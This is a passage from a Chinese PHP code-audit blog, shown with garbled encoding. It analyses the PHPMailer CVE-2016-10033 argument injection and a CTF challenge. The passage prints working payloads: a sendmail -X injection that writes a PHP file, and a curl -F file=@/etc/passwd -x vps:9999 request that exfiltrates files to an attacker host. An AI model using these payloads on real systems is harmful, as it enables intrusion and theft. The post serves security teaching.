è¿›è¡Œæ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œå¯ç”¨äºæ”»å‡»çš„ä»£ç åªæ˜¯åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šå¤šäº†ä¸€ä¸ªå•å¼•å·ã€‚ä¹‹æ‰€ä»¥è¿™æ¬¡çš„æ”»å‡»ä»£ç èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºä¿®å¤ä»£ç å¤šäº†  <strong>escapeshellcmd</strong> å‡½æ•°ï¼Œç»“åˆä¸Š <strong>mail()</strong> å‡½æ•°åº•å±‚è°ƒç”¨çš„ <strong>escapeshellarg</strong> å‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png"></p><p>æˆ‘ä»¬çš„ <strong>payload</strong> æœ€ç»ˆåœ¨æ‰§è¡Œæ—¶å˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-fa&#x27;\\&#x27;&#x27;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#x27;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§åˆšæ‰ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å°†payloadåŒ–ç®€åˆ†å‰²ä¸€ä¸‹å°±æ˜¯<code>-fa\(</code>ã€<code>-OQueueDirectory=/tmp</code>ã€<code>-X/var/www/html/test.php</code>ã€<code>)@a.com&#39;</code>ï¼Œè¿™å››ä¸ªéƒ¨åˆ†ã€‚æœ€ç»ˆçš„å‚æ•°å°±æ˜¯è¿™æ ·è¢«æ³¨å…¥çš„ã€‚</p><p>æ¼æ´åˆ©ç”¨</p><p>æ¼æ´æœ‰ä¸€äº›åŸºæœ¬è¦æ±‚ï¼š<br><strong>1ã€php version &lt; 5.2.0</strong><br><strong>2ã€phpmailer &lt; 5.2.18</strong><br><strong>3ã€php æ²¡æœ‰å®‰è£… pcreï¼ˆno defaultï¼‰</strong><br><strong>4ã€safe_mode &#x3D; falseï¼ˆdefaultï¼‰</strong></p><p>å­˜åœ¨æ­£åˆ™ç»•è¿‡ä¹‹åï¼Œä»¥åŠ <strong>escapeshellarg</strong>  å’Œ <strong>escapeshellcmd</strong> ä¸€èµ·ä½¿ç”¨é€ æˆçš„ç¥å¥‡ç°è±¡ä¹‹åã€‚</p><p>åªéœ€è¦ <strong>phpmailer &lt; 5.2.20</strong> </p><p><strong><a href="https://github.com/opsxcq/exploit-CVE-2016-10033">ç¯å¢ƒï¼Œpocï¼Œexpç›¸å…³</a></strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png"></p><h3 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ <strong>PHPMailer</strong> å®˜æ–¹ç»™å‡ºçš„ä¿®å¤ä»£ç ã€‚å®˜æ–¹å¯¹ç”¨æˆ·ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœå½“ä¸­å­˜åœ¨è¢«è½¬ä¹‰çš„å­—ç¬¦ï¼Œåˆ™ä¸ä¼ é€’ <strong>-f</strong> å‚æ•°ï¼ˆ**-f** å‚æ•°è¡¨ç¤ºå‘é‚®ä»¶çš„äººï¼Œå¦‚æœä¸ä¼ é€’è¯¥å‚æ•°ï¼Œæˆ‘ä»¬çš„payloadå°±ä¸ä¼šè¢«å¸¦å…¥ <strong>mail</strong> å‡½æ•°ï¼Œä¹Ÿå°±ä¸ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œï¼‰ï¼Œæ‰€ä»¥ä¸å»ºè®®å¤§å®¶åŒæ—¶ä½¿ç”¨ <strong>escapeshellcmd()</strong> å’Œ <strong>escapeshellarg()</strong> å‡½æ•°å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå…·ä½“ä¿®å¤ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png"></p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>çœ‹å®Œäº†ä¸Šè¿°åˆ†æï¼Œä¸çŸ¥é“å¤§å®¶æ˜¯å¦å¯¹ <strong>escapeshellarg()</strong> å’Œ <strong>escapeshellcmd()</strong> ä¸¤ä¸ªå‡½æ•°ä¸€èµ·ä½¿ç”¨æ‰€äº§ç”Ÿçš„é—®é¢˜ï¼Œæœ‰äº†æ›´åŠ æ·±å…¥çš„ç†è§£ï¼Œæ–‡ä¸­ç”¨åˆ°çš„ä»£ç å¯ä»¥ä» <a href="https://github.com/PHPMailer/PHPMailer">è¿™é‡Œ</a> ä¸‹è½½ï¼Œå½“ç„¶æ–‡ä¸­è‹¥æœ‰ä¸å½“ä¹‹å¤„ï¼Œè¿˜æœ›å„ä½æ–§æ­£ã€‚å¦‚æœä½ å¯¹æˆ‘ä»¬çš„é¡¹ç›®æ„Ÿå…´è¶£ï¼Œæ¬¢è¿å‘é€é‚®ä»¶åˆ° <strong><a href="mailto:&#x68;&#x6f;&#x6e;&#x67;&#x72;&#x69;&#115;&#101;&#x63;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x68;&#x6f;&#x6e;&#x67;&#x72;&#x69;&#115;&#101;&#x63;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a></strong> è”ç³»æˆ‘ä»¬ã€‚<strong>Day5</strong> çš„åˆ†ææ–‡ç« å°±åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬æœ€åç•™äº†ä¸€é“CTFé¢˜ç›®ç»™å¤§å®¶ç»ƒæ‰‹ï¼Œé¢˜ç›®å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿå…¨å±€å˜é‡è¦†ç›–ï¼Œç»“åˆ unset å‡½æ•°ç»•è¿‡wafï¼Œä»¥åŠé€šè¿‡ curl è¯»å–æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ä»£ç åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†çœ‹çœ‹å§ã€‚æˆ‘ä»¬çœ‹åˆ° ç¬¬11è¡Œ-14è¡Œ æœ‰è¿™æ ·ä¸€ä¸²ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹è¿™ä¸²ä»£ç çš„é€»è¾‘ï¼š<br>é¦–å…ˆ ç¬¬ä¸€è¡Œ ï¼Œå¾ªç¯è·å–å­—ç¬¦ä¸² GETã€POSTã€COOKIE ï¼Œå¹¶ä¾æ¬¡èµ‹å€¼ç»™å˜é‡ $__R ã€‚åœ¨ ç¬¬äºŒè¡Œ ä¸­å…ˆåˆ¤æ–­ $$__R å˜é‡æ˜¯å¦å­˜åœ¨æ•°æ®ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ç»§ç»­åˆ¤æ–­è¶…å…¨å±€æ•°ç»„ GETã€POSTã€COOKIE ä¸­æ˜¯å¦å­˜åœ¨é”®å€¼ç›¸ç­‰çš„ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™åˆ é™¤è¯¥å˜é‡ã€‚è¿™é‡Œæœ‰ä¸ª å¯å˜å˜é‡ çš„æ¦‚å¿µéœ€è¦å…ˆç†è§£ä¸€ä¸‹ã€‚å¯å˜å˜é‡æŒ‡çš„æ˜¯ï¼šä¸€ä¸ªå˜é‡çš„å˜é‡åå¯ä»¥åŠ¨æ€çš„è®¾ç½®å’Œä½¿ç”¨ã€‚ä¸€ä¸ªå¯å˜å˜é‡è·å–äº†ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºå…¶å˜é‡åã€‚<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png"></p><p>è¿™é‡Œä½¿ç”¨ <strong>$$</strong> å°†é€šè¿‡ <strong>å˜é‡a</strong> è·å–åˆ°çš„æ•°æ®ï¼Œæ³¨å†Œæˆä¸ºä¸€ä¸ª<strong>æ–°çš„å˜é‡</strong>ï¼ˆè¿™é‡Œæ˜¯ <strong>å˜é‡hello</strong> ï¼‰ã€‚ç„¶åä¼šå‘ç°å˜é‡ <strong>$$a</strong> çš„è¾“å‡ºæ•°æ®å’Œå˜é‡ <strong>$hello</strong>  çš„è¾“å‡ºæ•°æ®ä¸€è‡´ï¼ˆå¦‚ä¸Šå›¾ï¼Œè¾“å‡ºä¸º <strong>world</strong> ï¼‰ã€‚</p><p>æˆ‘é€šè¿‡ <strong>GET</strong> è¯·æ±‚å‘ <strong>index.php</strong> æäº¤ <strong>flag&#x3D;test</strong> ï¼Œæ¥ç€é€šè¿‡ <strong>POST</strong> è¯·æ±‚æäº¤ <strong>_GET[flag]&#x3D;test</strong> ã€‚å½“å¼€å§‹éå† <strong>$_POST</strong> è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ <strong>$__k</strong> ä»£è¡¨ <strong>_GET[flag]</strong> ï¼Œæ‰€ä»¥ <strong>$$__k</strong> å°±æ˜¯ <strong>$_GET[flag]</strong> ï¼Œå³ <strong>test</strong> å€¼ï¼Œæ­¤æ—¶ <strong>$$__k</strong> &#x3D;&#x3D; <strong>$__v</strong> æˆç«‹ï¼Œå˜é‡ <strong>$_GET[flag]</strong> å°±è¢« <strong>unset</strong> äº†ã€‚ä½†æ˜¯åœ¨ <strong>ç¬¬21è¡Œ</strong> å’Œ <strong>22è¡Œ</strong> æœ‰è¿™æ ·ä¸€ä¸²ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p> <strong>extract</strong> å‡½æ•°çš„ä½œç”¨æ˜¯å°†å¯¹è±¡å†…çš„é”®åå˜æˆä¸€ä¸ªå˜é‡åï¼Œè€Œè¿™ä¸ªå˜é‡å¯¹åº”çš„å€¼å°±æ˜¯è¿™ä¸ªé”®åçš„å€¼ï¼Œ <strong>EXTR_SKIP</strong> å‚æ•°è¡¨ç¤ºå¦‚æœå‰é¢å­˜åœ¨æ­¤å˜é‡ï¼Œä¸å¯¹å‰é¢çš„å˜é‡è¿›è¡Œè¦†ç›–å¤„ç†ã€‚ç”±äºæˆ‘ä»¬å‰é¢é€šè¿‡ <strong>POST</strong> è¯·æ±‚æäº¤ <strong>_GET[flag]&#x3D;test</strong> ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå˜æˆ <strong>$_GET[flag]&#x3D;test</strong> ï¼Œè¿™é‡Œçš„ <strong>$_GET</strong> å˜é‡å°±ä¸éœ€è¦å†ç»è¿‡ <strong>waf</strong> å‡½æ•°æ£€æµ‹äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº† <strong>preg_match(â€˜&#x2F;flag&#x2F;iâ€™,$key)</strong> çš„é™åˆ¶ã€‚ä¸‹é¢ä¸¾ä¸ª <strong>extract</strong> å‡½æ•°ç”¨ä¾‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png"></p><p>æ¥ç€åˆ°äº†24è¡Œæ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„md5å€¼ï¼Œæˆ‘ä»¬æ„é€ å‡º2ä¸ª0eå¼€å¤´çš„md5å³å¯ç»•è¿‡ï¼Œè¿™æ ·å°±è¿›å…¥ç¬¬äºŒé˜¶æ®µã€‚</p><p>ç¬¬äºŒé˜¶æ®µä¸»è¦è€ƒå¯Ÿ <strong>curl</strong> è¯»å–æ–‡ä»¶ã€‚è¿™é‡Œä¸»è¦åŠ äº†ä¸¤ä¸ªå‘ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡çš„ä¸¤ä¸ªå‡½æ•° <strong>escapeshellarg()</strong> å’Œ <strong>escapeshellcmd()</strong> ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ä¼šé€ æˆçš„é—®é¢˜ï¼Œä¸»è¦çœ‹çœ‹è¿™éƒ¨åˆ†ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <strong>ç¬¬8è¡Œ</strong> å’Œ <strong>ç¬¬9è¡Œ</strong> å¢åŠ äº†ä¸¤ä¸ªè¿‡æ»¤ã€‚</p><ul><li><strong>escapeshellarg</strong> ï¼Œå°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·</li><li><strong>escapeshellcmd</strong> ï¼Œä¼šå¯¹ä»¥ä¸‹çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰&amp;#;<code>|*?~&lt;&gt;^()[]&#123;&#125;$</code>, <code>x0A</code> å’Œ <code>xFF</code>, <code>&#39;</code> å’Œ <code>&quot;</code>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚</li></ul><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png"></p><p>åœ¨å­—ç¬¦ä¸²å¢åŠ äº†å¼•å·åŒæ—¶ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œé‚£ä¹ˆä¹‹å‰çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure><p>å› ä¸ºå¢åŠ äº† <strong>â€˜</strong> è¿›è¡Œäº†è½¬ä¹‰ï¼Œæ‰€ä»¥æ•´ä¸ªå­—ç¬¦ä¸²ä¼šè¢«å½“æˆå‚æ•°ã€‚æ³¨æ„ <strong>escapeshellcmd</strong> çš„é—®é¢˜æ˜¯åœ¨äºå¦‚æœ <strong>â€˜</strong> å’Œ <strong>â€œ</strong> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¤šå¢åŠ ä¸€ä¸ª <strong>â€˜</strong> å°±å¯ä»¥æ‰°ä¹±ä¹‹å‰çš„è½¬ä¹‰äº†ã€‚å¦‚ä¸‹ï¼š<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png"></p><p>åœ¨ <strong>curl</strong> ä¸­å­˜åœ¨ <strong>-F</strong> æäº¤è¡¨å•çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æäº¤æ–‡ä»¶ã€‚ <strong>-F &lt;key&#x3D;value&gt;</strong> å‘æœåŠ¡å™¨POSTè¡¨å•ï¼Œä¾‹å¦‚ï¼š <strong>curl -F â€œweb&#x3D;@index.html;type&#x3D;text&#x2F;htmlâ€ url.com</strong> ã€‚æäº¤æ–‡ä»¶ä¹‹åï¼Œåˆ©ç”¨ä»£ç†çš„æ–¹å¼è¿›è¡Œç›‘å¬ï¼Œè¿™æ ·å°±å¯ä»¥æˆªè·åˆ°æ–‡ä»¶äº†,åŒæ—¶è¿˜ä¸å—æœ€åçš„çš„å½±å“ã€‚é‚£ä¹ˆæœ€åçš„payloadä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png"></p><p>è¿™é‡Œåº”è¯¥æ˜¯å’Œ <strong>curl</strong> ç‰ˆæœ¬æœ‰å…³ç³»ï¼Œæˆ‘åœ¨ **7.54.0 ** ä¸‹æ²¡æœ‰æµ‹è¯•æˆåŠŸã€‚<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png"></p><p>é¢˜ç›®ä¸­çš„ <strong>curl</strong> ç‰ˆæœ¬æ˜¯ <strong>7.19.7</strong><br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png"></p><p>æ ¹æ®çŒœæµ‹ï¼Œå¯èƒ½åœ¨æ˜¯æ–°ç‰ˆæœ¬ä¸­ï¼Œå…ˆä¼šæ‰§è¡Œ <strong>curl http</strong> çš„æ“ä½œï¼Œä½†æ˜¯ç”±äºåœ¨åé¢å¢åŠ äº†,ä¾‹å¦‚ <strong><a href="http://127.0.0.1,/">http://127.0.0.1ï¼Œ</a></strong> ä½†æ˜¯curlæ— æ³•æ‰¾åˆ°è¿™æ ·çš„æ–‡ä»¶ï¼Œå‡ºç°404ã€‚å‡ºç°404ä¹‹åï¼Œåé¢çš„æäº¤æ–‡ä»¶çš„æ“ä½œå°±ä¸è¿›è¡Œäº†ï¼Œç¨‹åºå°±é€€å‡ºäº†ã€‚è¿™æ ·åœ¨vpsä¸Šé¢å°±æ— æ³•æ¥å—åˆ°æ–‡ä»¶äº†ã€‚</p><h3 id="è§£é¢˜payloadï¼š"><a href="#è§£é¢˜payloadï¼š" class="headerlink" title="è§£é¢˜payloadï¼š"></a>è§£é¢˜payloadï¼š</h3><p>æ‰€ä»¥è¿™é¢˜æœ€åçš„ <strong>payload</strong> æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&#x27;</span> -<span class="keyword">F</span> <span class="string">file=@/var/www/html/flag.php</span> -x <span class="string"></span> vps:9999 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"></span><br><span class="line"><span class="language-sqf"><span class="variable">_GET</span>[<span class="built_in">flag</span>]=QNKCDZO&amp;<span class="variable">_GET</span>[hongri]=s878926199a&amp;<span class="variable">_GET</span>[url]=http:<span class="comment">//baidu.com/&#x27; -F file=@/var/www/html/flag.php -x  vps:9999</span></span></span><br></pre></td></tr></table></figure><p><a href="https://lorexxar.cn/2016/12/28/cve-2016-10030/">phpmailer RCEæ¼æ´åˆ†æ</a><br><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a><br><a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2016-10033ï¼‰åˆ†æ</a></p><h2 id="Forst-Pattern"><a href="#Forst-Pattern" class="headerlink" title="Forst Pattern"></a>Forst Pattern</h2><p>é¢˜ç›®å«ç¦æ–¯ç‰¹æ¨¡å¼ï¼Œä»£ç å¦‚ä¸‹<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-25.png"></p><p><strong>æ¼æ´è§£æ</strong> 